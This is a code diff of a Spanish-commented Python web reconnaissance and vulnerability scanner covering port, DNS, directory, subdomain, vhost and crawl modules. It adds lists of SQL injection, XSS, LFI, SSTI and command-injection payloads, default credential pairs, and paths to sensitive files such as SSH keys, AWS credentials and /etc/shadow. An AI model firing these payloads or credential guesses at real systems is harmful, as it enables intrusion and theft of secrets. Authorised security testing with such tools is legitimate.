+    "api/docs","api/swagger","api/openapi",
+    "api/graphql","api/rest",
+    "api/internal","api/private","api/debug",
+    "api/test","api/dev",
+    "rest/api","rest/v1","rest/v2",
+    "v1","v2","v3",
+    "api/products","api/orders","api/items",
+    "api/comments","api/posts","api/pages",
+    "api/notifications","api/messages",
+    "api/roles","api/permissions",
+    "api/keys","api/tokens","api/sessions",
+    "api/logs","api/events","api/audit",
+    "api/export","api/import","api/backup",
+    "_api","__api","api_v1","api_v2",
+    "api/.json","api/swagger.json","api/openapi.yaml",
+    "api/schema","api/metadata",
 ]
 
 DEFAULT_CREDS = [
-    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
-    ("admin", "admin123"), ("admin", "12345"), ("admin", "1234"),
-    ("administrator", "administrator"), ("root", "root"),
-    ("root", "toor"), ("root", "password"), ("root", "123456"),
-    ("test", "test"), ("guest", "guest"), ("user", "user"),
-    ("demo", "demo"), ("admin", "changeme"), ("admin", "default"),
-    ("admin", "pass"), ("admin", "letmein"), ("tomcat", "tomcat"),
-    ("manager", "manager"), ("admin", "P@ssw0rd"), ("admin", "qwerty"),
+    ("admin","admin"),("admin","password"),("admin","123456"),
+    ("admin","admin123"),("admin","12345"),("admin","1234"),
+    ("administrator","administrator"),("root","root"),
+    ("root","toor"),("root","password"),("root","123456"),
+    ("test","test"),("guest","guest"),("user","user"),
+    ("demo","demo"),("admin","changeme"),("admin","default"),
+    ("admin","pass"),("admin","letmein"),("tomcat","tomcat"),
+    ("manager","manager"),("admin","P@ssw0rd"),("admin","qwerty"),
+    ("admin","welcome"),("admin","master"),("admin","passw0rd"),
+    ("ftp","ftp"),("oracle","oracle"),("postgres","postgres"),
+    ("mysql","mysql"),("sa",""),("sa","sa"),
 ]
+
+# Archivos sensibles para descubrimiento
+SENSITIVE_FILES = [
+    ".git/config",".git/HEAD",".git/logs/HEAD",".git/index",
+    ".env",".env.bak",".env.local",".env.production",
+    ".htaccess",".htpasswd",
+    "web.config","nginx.conf","httpd.conf",
+    "wp-config.php","wp-config.php.bak","wp-config.php~",
+    "config.php","config.inc.php","config.old","config.bak",
+    "database.yml","database.php","db.php","db_config.php",
+    "settings.py","settings.ini","settings.cfg",
+    "application.yml","application.properties",
+    "appsettings.json","appsettings.Development.json",
+    "composer.json","package.json","Gemfile","requirements.txt",
+    "Dockerfile","docker-compose.yml",".dockerignore",
+    ".travis.yml",".gitlab-ci.yml","Jenkinsfile",
+    "phpinfo.php","info.php","test.php",
+    "server-status","server-info",
+    ".DS_Store","Thumbs.db",
+    "crossdomain.xml","clientaccesspolicy.xml",
+    "robots.txt","sitemap.xml","security.txt",
+    "id_rsa","id_rsa.pub","id_dsa",
+    ".ssh/authorized_keys",".ssh/id_rsa",
+    "backup.sql","backup.zip","backup.tar.gz",
+    "dump.sql","database.sql","data.sql",
+    ".bash_history",".bashrc",".profile",
+    "/etc/passwd","/etc/shadow","/etc/hosts",
+    "wp-json/wp/v2/users",
+    "actuator/env","actuator/heapdump","actuator/configprops",
+    "trace.axd","elmah.axd",
+    "firebase.json",".firebaserc",
+    "aws.yml",".aws/credentials",
+    "sftp-config.json","ftpsync.settings",
+    "WEB-INF/web.xml","META-INF/context.xml",
+    ".svn/entries",".svn/wc.db",
+    ".hg/store","CVS/Entries",
+]
+
+# Payloads de inyeccion mejorados
+SQLI_PAYLOADS = [
+    "'","''","\"","' OR '1'='1","' OR '1'='1'--","' OR '1'='1'/*",
+    "' OR 1=1--","' OR 1=1#","\" OR 1=1--","\" OR \"\"=\"",
+    "admin'--","1' ORDER BY 1--","1' ORDER BY 100--",
+    "1 UNION SELECT NULL--","1 UNION SELECT NULL,NULL--",
+    "' AND 1=1--","' AND 1=2--",
+    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    "';WAITFOR DELAY '0:0:5'--","' AND SLEEP(5)--","' AND pg_sleep(5)--",
+    "1' AND BENCHMARK(5000000,MD5('test'))--",
+    "') OR ('1'='1","')) OR (('1'='1",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+    "1' AND 1=CONVERT(int,(SELECT @@version))--",
+    "' UNION SELECT username,password FROM users--",
+    "1; DROP TABLE--",
+    "' OR ''='","1 OR 1=1",
+]
+
+SQLI_ERRORS = [
+    "you have an error in your sql syntax","mysql_fetch","mysql_num_rows",
+    "warning: mysql","unclosed quotation mark","microsoft ole db",
+    "odbc sql server driver","syntax error","postgresql","pg_query",
+    "pg_exec","ora-01756","ora-00933","ora-00936","ora-00907",
+    "sqlite3::","sqlite_","sqliteexception","pdo::","pdoexception",
+    "sql syntax","sql error","sql command","database error","query failed",
+    "db error","unexpected end of sql","unterminated string",
+    "invalid query","sql server","jdbc","hibernate","jpa",
+    "sqlalchemy","sequelize","prisma",
+    "mariadb","microsoft sql","sql state","column count doesn't match",
+    "supplied argument is not a valid mysql",
+    "quoted string not properly terminated",
+    "division by zero","conversion failed",
+]
+
+XSS_PAYLOADS = [
+    '<script>alert(1)</script>',
+    '"><script>alert(1)</script>',
+    "'-alert(1)-'",
+    '<img src=x onerror=alert(1)>',
+    '"><img src=x onerror=alert(1)>',
+    '<svg onload=alert(1)>',
+    '"><svg/onload=alert(1)>',
+    "javascript:alert(1)",
+    '<body onload=alert(1)>',
+    '<input onfocus=alert(1) autofocus>',
+    '<details open ontoggle=alert(1)>',
+    '<iframe src="javascript:alert(1)">',
+    '{{constructor.constructor("return this")().alert(1)}}',
+    '${alert(1)}',
+    '<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//",
+    '<a href="javascript:alert(1)">click</a>',
+    '<div onmouseover="alert(1)">hover</div>',
+    "'-alert(1)//",
+    '\';alert(1);//',
+    "</script><script>alert(1)</script>",
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+]
+
+LFI_PAYLOADS = [
+    "../../../etc/passwd","....//....//....//etc/passwd",
+    "..\\..\\..\\etc\\passwd","..%2f..%2f..%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "....//....//....//....//etc/passwd",
+    "/etc/passwd","/etc/shadow","/etc/hosts",
+    "../../../../../../etc/passwd%00",
+    "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=string.rot13/resource=index.php",
+    "php://input",
+    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
+    "expect://id",
+    "file:///etc/passwd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "C:\\Windows\\win.ini","C:\\boot.ini",
+    "....\\\\....\\\\....\\\\windows\\\\win.ini",
+    "/proc/self/environ","/proc/self/cmdline","/proc/version",
+    "/var/log/apache2/access.log","/var/log/apache2/error.log",
+    "/var/log/nginx/access.log","/var/log/nginx/error.log",
+    "/var/log/auth.log","/var/log/syslog",
+]
+
+SSTI_PAYLOADS = [
+    ("{{7*7}}", "49"),
+    ("${7*7}", "49"),
+    ("#{7*7}", "49"),
+    ("<%= 7*7 %>", "49"),
+    ("{{7*'7'}}", "7777777"),
+    ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"),
+    ("{{config}}", "SECRET_KEY"),
+    ("{{self.__class__}}", "__class__"),
+    ("{{request.application.__globals__}}", "__globals__"),
+    ("{{''.__class__.__mro__[2].__subclasses__()}}", "subprocess"),
+    ("${{7*7}}", "49"),
+    ("{{constructor.constructor('return 1')()}}", "1"),
+    ("{%25+import+os+%25}{{os.popen('id').read()}}", "uid="),
+    ("{{range.constructor(\"return global.process.mainModule\")()}}", "process"),
+]
+
+CMDI_PAYLOADS = [
+    (";sleep 5", 5), ("|sleep 5", 5), ("||sleep 5", 5),
+    ("&sleep 5", 5), ("&&sleep 5", 5),
+    ("`sleep 5`", 5), ("$(sleep 5)", 5),
+    ("\nsleep 5", 5), ("\rsleep 5", 5),
+    (";ping -c 5 127.0.0.1", 5),
+    ("|ping -c 5 127.0.0.1", 5),
+    (";timeout 5", 5),
+    # Windows
+    ("&timeout /t 5", 5), ("|timeout /t 5", 5),
+    ("&ping -n 5 127.0.0.1", 5),
+]
+
+
+# =====================================================================
+#  HTML LINK PARSER
+# =====================================================================
+class LinkParser(HTMLParser):
+    def __init__(self):
+        super().__init__()
+        self.links = []
+        self.forms = []
+        self.params = set()
+        self.emails = set()
+        self.js_files = []
+        self._current_form = None
+
+    def handle_starttag(self, tag, attrs):
+        d = dict(attrs)
+        if tag == "a" and "href" in d:
+            self.links.append(d["href"])
+        if tag == "form":
+            self._current_form = {"action": d.get("action",""), "method": d.get("method","GET"), "inputs": []}
+        if tag in ("input","textarea","select") and self._current_form is not None:
+            name = d.get("name","")
+            if name:
+                self._current_form["inputs"].append(name)
+                self.params.add(name)
+        if tag == "script" and "src" in d:
+            self.js_files.append(d["src"])
+        if tag == "img" and "src" in d:
+            pass
+        if tag in ("input","textarea") and d.get("name"):
+            self.params.add(d["name"])
+
+    def handle_endtag(self, tag):
+        if tag == "form" and self._current_form is not None:
+            self.forms.append(self._current_form)
+            self._current_form = None
+
+    def handle_data(self, data):
+        for em in re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', data):
+            self.emails.add(em)
 
 
 # =====================================================================
 #  MODULE 1: PORT SCANNER
 # =====================================================================
-def mod_port_scan(target_host, ports, threads, timeout, rate_limiter, results):
-    """Escaneo de puertos TCP connect."""
+def mod_port_scan(ctx):
     section_header("PORT SCANNER")
-    log_info(f"Escaneando {len(ports)} puertos en {target_host}...")
-
+    ports = ctx["ports"]
+    host = ctx["target_host"]
+    log_info(f"Escaneando {len(ports)} puertos en {host}...")
     open_ports = []
-    closed = 0
-    filtered = 0
+    closed = 0; filtered = 0
 
     def scan_port(port):
-        if rate_limiter:
-            rate_limiter.wait()
+        ctx["rate_limiter"].wait()
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(timeout)
+        sock.settimeout(ctx["timeout"])
         try:
-            result = sock.connect_ex((target_host, port))
-            if result == 0:
-                return ("open", port)
-            else:
-                return ("closed", port)
+            r = sock.connect_ex((host, port))
+            return ("open", port) if r == 0 else ("closed", port)
         except socket.timeout:
             return ("filtered", port)
         except Exception:
@@ -473,2105 +707,2327 @@ def mod_port_scan(target_host, ports, threads, timeout, rate_limiter, results):
         finally:
             sock.close()
 
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {executor.submit(scan_port, p): p for p in ports}
-        for future in as_completed(futures):
-            status, port = future.result()
-            if status == "open":
+    scan_list = list(ports)
+    if ctx["mode_config"]["randomize"]:
+        random.shuffle(scan_list)
+
+    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
+        futures = {executor.submit(scan_port, p): p for p in scan_list}
+        for f in as_completed(futures):
+            st, port = f.result()
+            if st == "open":
                 open_ports.append(port)
                 log_ok(f"Puerto {port}/tcp ABIERTO")
-            elif status == "filtered":
+            elif st == "filtered":
                 filtered += 1
             else:
                 closed += 1
 
     open_ports.sort()
-    results["open_ports"] = open_ports
+    ctx["results"]["open_ports"] = open_ports
     log_info(f"Resultados: {len(open_ports)} abiertos, {closed} cerrados, {filtered} filtrados")
 
 
 # =====================================================================
 #  MODULE 2: SERVICE DETECTION
 # =====================================================================
-def mod_service_detect(target_host, open_ports, timeout, results):
-    """Banner grabbing en puertos abiertos."""
+def mod_service_detect(ctx):
     section_header("SERVICE DETECTION")
-
+    open_ports = ctx["results"].get("open_ports", [])
     if not open_ports:
         log_info("No hay puertos abiertos para analizar.")
         return
 
-    services = []
-    common_services = {
-        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
-        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
-        993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 3306: "MySQL",
-        3389: "RDP", 5432: "PostgreSQL", 6379: "Redis", 8080: "HTTP-Proxy",
-        8443: "HTTPS-Alt", 27017: "MongoDB", 11211: "Memcached",
+    common = {
+        21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
+        110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
+        995:"POP3S",1433:"MSSQL",3306:"MySQL",3389:"RDP",
+        5432:"PostgreSQL",6379:"Redis",8080:"HTTP-Proxy",
+        8443:"HTTPS-Alt",27017:"MongoDB",11211:"Memcached",
     }
-
+    services = []
     for port in open_ports:
+        ctx["rate_limiter"].wait()
         banner = ""
-        service_name = common_services.get(port, "Unknown")
-
-        # Try banner grab
+        svc = common.get(port, "Unknown")
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(timeout)
-            sock.connect((target_host, port))
-
-            # For SSL ports, wrap in SSL
-            if port in (443, 8443, 993, 995, 465, 636):
-                ctx = ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
-                sock = ctx.wrap_socket(sock, server_hostname=target_host)
-
-            # Send probe for HTTP ports
-            if port in (80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 8008, 9090):
-                sock.send(f"HEAD / HTTP/1.1\r\nHost: {target_host}\r\n\r\n".encode())
-
+            sock.settimeout(ctx["timeout"])
+            sock.connect((ctx["target_host"], port))
+            if port in (443,8443,993,995,465,636):
+                c2 = ssl.create_default_context()
+                c2.check_hostname = False
+                c2.verify_mode = ssl.CERT_NONE
+                sock = c2.wrap_socket(sock, server_hostname=ctx["target_host"])
+            if port in (80,443,8080,8443,8000,8888,3000,5000,8008,9090):
+                sock.send(f"HEAD / HTTP/1.1\r\nHost: {ctx['target_host']}\r\n\r\n".encode())
             sock.settimeout(3)
             banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
             sock.close()
         except Exception:
             pass
-
-        # Extract service info from banner
         if banner:
-            # HTTP Server header
-            srv_match = re.search(r'Server:\s*(.+)', banner, re.I)
-            if srv_match:
-                service_name = srv_match.group(1).strip()
+            m = re.search(r'Server:\s*(.+)', banner, re.I)
+            if m:
+                svc = m.group(1).strip()
             elif "SSH" in banner:
-                service_name = banner.split("\n")[0].strip()
+                svc = banner.split("\n")[0].strip()
             elif "FTP" in banner:
-                service_name = banner.split("\n")[0].strip()
-            elif "SMTP" in banner:
-                service_name = banner.split("\n")[0].strip()
+                svc = banner.split("\n")[0].strip()
+        services.append({"port": port, "service": svc, "banner": banner[:200]})
+        log_ok(f"{port}/tcp -> {svc}")
 
-        services.append({
-            "port": port,
-            "service": service_name,
-            "banner": banner[:200] if banner else "",
-        })
-        log_ok(f"{port}/tcp -> {service_name}")
-
-    results["services"] = services
+    ctx["results"]["services"] = services
 
 
 # =====================================================================
-#  MODULE 3: DIRECTORY BRUTEFORCE
+#  MODULE 3: DNS ZONE TRANSFER
 # =====================================================================
-def mod_dir_bruteforce(session, base_url, wordlist, threads, extensions, rate_limiter, results):
-    """Descubrimiento de directorios y archivos."""
+def mod_zone_transfer(ctx):
+    section_header("DNS ZONE TRANSFER")
+    domain = ctx["domain"]
+    if not dns:
+        log_warn("dnspython no instalado, saltando modulo.")
+        return
+    findings = []
+    try:
+        ns_records = dns.resolver.resolve(domain, "NS")
+        for ns in ns_records:
+            ns_host = str(ns.target).rstrip(".")
+            log_info(f"Probando AXFR en {ns_host}...")
+            ctx["rate_limiter"].wait()
+            try:
+                z = dns.zone.from_xfr(dns.query.xfr(ns_host, domain, timeout=10))
+                names = z.nodes.keys()
+                log_vuln("HIGH", f"Zone transfer exitoso en {ns_host}! ({len(names)} registros)")
+                for n in list(names)[:50]:
+                    findings.append(str(n) + "." + domain)
+                    log_ok(f"  {n}.{domain}")
+            except Exception:
+                log_info(f"  AXFR denegado en {ns_host}")
+    except Exception as e:
+        log_fail(f"No se pudieron resolver NS: {e}")
+    ctx["results"]["zone_transfer"] = findings
+
+
+# =====================================================================
+#  MODULE 4: DNS RECON
+# =====================================================================
+def mod_dns_recon(ctx):
+    section_header("DNS RECON")
+    domain = ctx["domain"]
+    if not dns:
+        log_warn("dnspython no instalado.")
+        return
+    records = {}
+    for rtype in ["A","AAAA","MX","TXT","NS","SOA","CNAME","SRV","CAA","PTR"]:
+        ctx["rate_limiter"].wait()
+        try:
+            answers = dns.resolver.resolve(domain, rtype)
+            records[rtype] = [str(r) for r in answers]
+            for r in answers:
+                log_ok(f"{rtype}: {r}")
+        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers, Exception):
+            pass
+
+    # SPF / DMARC / DKIM checks
+    for sub, label in [("_dmarc", "DMARC"), ("default._domainkey", "DKIM")]:
+        ctx["rate_limiter"].wait()
+        try:
+            answers = dns.resolver.resolve(f"{sub}.{domain}", "TXT")
+            for r in answers:
+                log_ok(f"{label}: {r}")
+                records[label] = str(r)
+        except Exception:
+            pass
+
+    ctx["results"]["dns_records"] = records
+
+
+# =====================================================================
+#  MODULE 5: DIRECTORY BRUTEFORCE
+# =====================================================================
+def mod_dirbust(ctx):
     section_header("DIRECTORY BRUTEFORCE")
-
+    base = ctx["base_url"]
+    session = ctx["session"]
+    wordlist = ctx.get("custom_wordlist") or DIR_WORDLIST
+    extensions = ctx.get("extensions", "php,html,txt,bak,old,asp,aspx,jsp,json,xml,yml,yaml,conf,cfg,ini,log,sql,zip,tar.gz,rar").split(",")
     found = []
-    total = len(wordlist)
-    checked = [0]
-    lock = threading.Lock()
 
-    # Build URL list with extensions
-    urls_to_check = []
-    for word in wordlist:
-        urls_to_check.append(f"{base_url}/{word}")
+    paths = list(wordlist)
+    for word in list(wordlist):
         for ext in extensions:
-            urls_to_check.append(f"{base_url}/{word}.{ext}")
+            paths.append(f"{word}.{ext}")
+    paths = list(set(paths))
+    if ctx["mode_config"]["randomize"]:
+        random.shuffle(paths)
 
-    log_info(f"Probando {len(urls_to_check)} paths...")
+    log_info(f"Probando {len(paths)} rutas...")
+    checked = 0
 
-    def check_path(url):
-        resp = safe_request(session, "GET", url, rate_limiter)
-        with lock:
-            checked[0] += 1
-            if checked[0] % 100 == 0:
-                log_info(f"Progreso: {checked[0]}/{len(urls_to_check)}")
-
-        if resp is None:
-            return None
-
-        if resp.status_code in (200, 201, 204, 301, 302, 307, 308, 401, 403, 405):
-            size = len(resp.content)
-            return {
-                "url": url,
-                "status": resp.status_code,
-                "size": size,
-                "redirect": resp.headers.get("Location", "") if resp.status_code in (301, 302, 307, 308) else "",
-            }
+    def check_path(path):
+        url = f"{base}/{path}"
+        r = safe_request(session, "GET", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if r and r.status_code not in (404, 502, 503):
+            return (path, r.status_code, len(r.content))
         return None
 
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {executor.submit(check_path, u): u for u in urls_to_check}
-        for future in as_completed(futures):
-            result = future.result()
+    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
+        futures = {executor.submit(check_path, p): p for p in paths}
+        for f in as_completed(futures):
+            checked += 1
+            result = f.result()
             if result:
-                found.append(result)
-                status = result["status"]
-                url = result["url"]
-                size = result["size"]
-                redir = result.get("redirect", "")
-
-                if status == 200:
-                    log_ok(f"[{status}] {url} ({size} bytes)")
-                elif status in (301, 302, 307, 308):
-                    log_ok(f"[{status}] {url} -> {redir}")
-                elif status == 401:
-                    log_warn(f"[{status}] {url} (Auth Required)")
-                elif status == 403:
-                    log_warn(f"[{status}] {url} (Forbidden)")
+                path, code, size = result
+                found.append({"path": path, "status": code, "size": size})
+                if code == 200:
+                    log_ok(f"/{path} [{code}] ({size} bytes)")
+                elif code in (301, 302, 303, 307, 308):
+                    log_ok(f"/{path} [{code}] REDIRECT")
+                elif code == 403:
+                    log_warn(f"/{path} [{code}] FORBIDDEN")
+                elif code == 401:
+                    log_warn(f"/{path} [{code}] AUTH REQUIRED")
                 else:
-                    log_info(f"[{status}] {url}")
+                    log_info(f"/{path} [{code}]")
 
-    results["directories"] = sorted(found, key=lambda x: x["status"])
-    log_info(f"Encontrados: {len(found)} paths")
+    ctx["results"]["directories"] = found
+    log_info(f"Encontrados: {len(found)} rutas ({checked} probadas)")
 
 
 # =====================================================================
-#  MODULE 4: SUBDOMAIN BRUTEFORCE
+#  MODULE 6: SUBDOMAIN BRUTEFORCE
 # =====================================================================
-def mod_subdomain_brute(domain, wordlist, threads, rate_limiter, results):
-    """Enumeracion de subdominios via DNS."""
+def mod_subdomain_brute(ctx):
     section_header("SUBDOMAIN BRUTEFORCE")
-
-    if not dns:
-        log_fail("dnspython no disponible. Instalar: pip install dnspython")
-        return
-
+    domain = ctx["domain"]
+    wordlist = ctx.get("custom_sublist") or SUB_WORDLIST
     found = []
-    log_info(f"Probando {len(wordlist)} subdominios de {domain}...")
+
+    subs = list(wordlist)
+    if ctx["mode_config"]["randomize"]:
+        random.shuffle(subs)
+
+    log_info(f"Probando {len(subs)} subdominios de {domain}...")
 
     def check_sub(sub):
-        if rate_limiter:
-            rate_limiter.wait()
         fqdn = f"{sub}.{domain}"
+        ctx["rate_limiter"].wait()
         try:
-            answers = dns.resolver.resolve(fqdn, "A")
-            ips = [str(r) for r in answers]
-            return {"subdomain": fqdn, "ips": ips}
-        except Exception:
+            answers = socket.getaddrinfo(fqdn, None)
+            ip = answers[0][4][0]
+            return (fqdn, ip)
+        except socket.gaierror:
             return None
 
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = {executor.submit(check_sub, s): s for s in wordlist}
-        for future in as_completed(futures):
-            result = future.result()
-            if result:
-                found.append(result)
-                log_ok(f"{result['subdomain']} -> {', '.join(result['ips'])}")
+    with ThreadPoolExecutor(max_workers=ctx["threads"]) as executor:
+        futures = {executor.submit(check_sub, s): s for s in subs}
+        for f in as_completed(futures):
+            r = f.result()
+            if r:
+                found.append({"subdomain": r[0], "ip": r[1]})
+                log_ok(f"{r[0]} -> {r[1]}")
 
-    results["subdomains_brute"] = found
+    ctx["results"]["subdomains"] = found
     log_info(f"Encontrados: {len(found)} subdominios")
 
 
 # =====================================================================
-#  MODULE 5: DNS ZONE TRANSFER
+#  MODULE 7: VHOST DISCOVERY
 # =====================================================================
-def mod_dns_zone_transfer(domain, results):
-    """Intento de transferencia de zona DNS (AXFR)."""
-    section_header("DNS ZONE TRANSFER")
-
-    if not dns:
-        log_fail("dnspython no disponible.")
-        return
-
-    results["zone_transfer"] = []
-
-    try:
-        ns_records = dns.resolver.resolve(domain, "NS")
-    except Exception:
-        log_fail("No se pudieron obtener nameservers.")
-        return
-
-    for ns in ns_records:
-        ns_host = str(ns).rstrip(".")
-        log_info(f"Intentando AXFR en {ns_host}...")
-        try:
-            zone = dns.zone.from_xfr(dns.query.xfr(ns_host, domain, timeout=10))
-            records = []
-            for name, node in zone.nodes.items():
-                records.append(str(name))
-            results["zone_transfer"].append({
-                "nameserver": ns_host,
-                "success": True,
-                "records": records[:100],
-            })
-            log_vuln("HIGH", f"Zone transfer EXITOSO en {ns_host}! {len(records)} records.")
-        except Exception:
-            log_info(f"Zone transfer denegado en {ns_host} (esperado).")
-
-
-# =====================================================================
-#  MODULE 6: VIRTUAL HOST DISCOVERY
-# =====================================================================
-def mod_vhost_discover(session, target_ip, base_url, domain, wordlist, rate_limiter, results):
-    """Descubrimiento de virtual hosts."""
-    section_header("VIRTUAL HOST DISCOVERY")
-
-    found = []
-    parsed = urlparse(base_url)
-    scheme = parsed.scheme
-    port = parsed.port or (443 if scheme == "https" else 80)
+def mod_vhost(ctx):
+    section_header("VHOST DISCOVERY")
+    base = ctx["base_url"]
+    domain = ctx["domain"]
+    session = ctx["session"]
 
     # Get baseline response
-    baseline = safe_request(session, "GET", base_url, rate_limiter)
-    if not baseline:
+    r = safe_request(session, "GET", base, ctx["rate_limiter"])
+    if not r:
         log_fail("No se pudo obtener respuesta baseline.")
         return
-    baseline_size = len(baseline.content)
-    baseline_code = baseline.status_code
+    baseline_size = len(r.content)
+    baseline_code = r.status_code
+    found = []
 
-    log_info(f"Baseline: [{baseline_code}] {baseline_size} bytes")
-    log_info(f"Probando {len(wordlist)} vhosts...")
+    vhosts = [f"{s}.{domain}" for s in SUB_WORDLIST[:60]]
+    if ctx["mode_config"]["randomize"]:
+        random.shuffle(vhosts)
 
-    for vhost_prefix in wordlist:
-        vhost = f"{vhost_prefix}.{domain}"
-        try:
-            resp = safe_request(session, "GET", f"{scheme}://{target_ip}:{port}/",
-                               rate_limiter,
-                               headers={"Host": vhost},
-                               timeout=5)
-            if resp is None:
-                continue
+    for vhost in vhosts:
+        r = safe_request(session, "GET", base, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
+                         headers={"Host": vhost})
+        if r and (r.status_code != baseline_code or abs(len(r.content) - baseline_size) > 100):
+            found.append({"vhost": vhost, "status": r.status_code, "size": len(r.content)})
+            log_ok(f"VHost: {vhost} [{r.status_code}] ({len(r.content)} bytes)")
 
-            resp_size = len(resp.content)
-            # Different response = potential vhost
-            if resp.status_code != baseline_code or abs(resp_size - baseline_size) > 100:
-                found.append({
-                    "vhost": vhost,
-                    "status": resp.status_code,
-                    "size": resp_size,
-                })
-                log_ok(f"[{resp.status_code}] {vhost} ({resp_size} bytes)")
-        except Exception:
-            pass
-
-    results["vhosts"] = found
-    log_info(f"Encontrados: {len(found)} virtual hosts potenciales")
+    ctx["results"]["vhosts"] = found
 
 
 # =====================================================================
-#  MODULE 7: WEB CRAWLER
+#  MODULE 8: WEB CRAWLER
 # =====================================================================
-class LinkParser(HTMLParser):
-    """Extrae links y forms de HTML."""
-    def __init__(self, base_url):
-        super().__init__()
-        self.base_url = base_url
-        self.links = set()
-        self.forms = []
-        self._current_form = None
-        self._current_inputs = []
-
-    def handle_starttag(self, tag, attrs):
-        attrs_dict = dict(attrs)
-        if tag == "a":
-            href = attrs_dict.get("href", "")
-            if href and not href.startswith(("#", "javascript:", "mailto:", "tel:")):
-                full = urljoin(self.base_url, href)
-                self.links.add(full)
-        elif tag == "form":
-            self._current_form = {
-                "action": urljoin(self.base_url, attrs_dict.get("action", "")),
-                "method": attrs_dict.get("method", "GET").upper(),
-            }
-            self._current_inputs = []
-        elif tag == "input" and self._current_form is not None:
-            self._current_inputs.append({
-                "name": attrs_dict.get("name", ""),
-                "type": attrs_dict.get("type", "text"),
-                "value": attrs_dict.get("value", ""),
-            })
-        elif tag in ("textarea", "select") and self._current_form is not None:
-            self._current_inputs.append({
-                "name": attrs_dict.get("name", ""),
-                "type": tag,
-                "value": "",
-            })
-
-    def handle_endtag(self, tag):
-        if tag == "form" and self._current_form is not None:
-            self._current_form["inputs"] = [i for i in self._current_inputs if i.get("name")]
-            self.forms.append(self._current_form)
-            self._current_form = None
-            self._current_inputs = []
-
-
-def mod_crawl(session, base_url, max_depth, max_pages, rate_limiter, results):
-    """Spider/crawl del sitio."""
+def mod_crawler(ctx):
     section_header("WEB CRAWLER")
+    base = ctx["base_url"]
+    session = ctx["session"]
+    max_depth = ctx.get("crawl_depth", 3)
+    max_pages = ctx.get("crawl_pages", 100)
 
-    domain = get_domain(base_url)
     visited = set()
-    to_visit = deque([(base_url, 0)])
+    queue = deque([(ctx["target_url"], 0)])
     all_links = set()
     all_forms = []
     all_params = set()
     all_emails = set()
-    all_js_files = set()
+    all_js = set()
 
-    log_info(f"Crawling {base_url} (max depth: {max_depth}, max pages: {max_pages})...")
-
-    while to_visit and len(visited) < max_pages:
-        url, depth = to_visit.popleft()
-
-        # Normalize
-        url = url.split("#")[0]
-        if url in visited:
+    while queue and len(visited) < max_pages:
+        url, depth = queue.popleft()
+        if url in visited or depth > max_depth:
             continue
-        if depth > max_depth:
-            continue
-
-        # Stay in scope
-        if get_domain(url) != domain:
-            all_links.add(url)
-            continue
-
         visited.add(url)
-        resp = safe_request(session, "GET", url, rate_limiter, allow_redirects=True)
-        if resp is None:
+
+        r = safe_request(session, "GET", url, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+        if not r or "text/html" not in r.headers.get("Content-Type", ""):
             continue
 
-        ct = resp.headers.get("content-type", "")
-        if "html" not in ct.lower() and "text" not in ct.lower():
-            continue
-
-        html = resp.text
-
-        # Parse links and forms
+        parser = LinkParser()
         try:
-            parser = LinkParser(url)
-            parser.feed(html)
-
-            for link in parser.links:
-                all_links.add(link)
-                if get_domain(link) == domain and link not in visited:
-                    to_visit.append((link, depth + 1))
-
-            for form in parser.forms:
-                all_forms.append(form)
-
+            parser.feed(r.text)
         except Exception:
-            pass
-
-        # Extract URL parameters
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
-        for p in params:
-            all_params.add(p)
-
-        # Extract JS files
-        js_matches = re.findall(r'src=["\']([^"\']*\.js[^"\']*)', html, re.I)
-        for js in js_matches:
-            full_js = urljoin(url, js)
-            all_js_files.add(full_js)
-
-        # Extract emails
-        emails = re.findall(r'[\w.+-]+@[\w-]+\.[\w.]+', html)
-        for e in emails:
-            all_emails.add(e)
-
-    results["crawl"] = {
-        "pages_visited": len(visited),
-        "links_found": len(all_links),
-        "forms": all_forms,
-        "params": list(all_params),
-        "js_files": list(all_js_files),
-        "emails": list(all_emails),
-        "visited_urls": list(visited),
-    }
-
-    log_ok(f"Paginas visitadas: {len(visited)}")
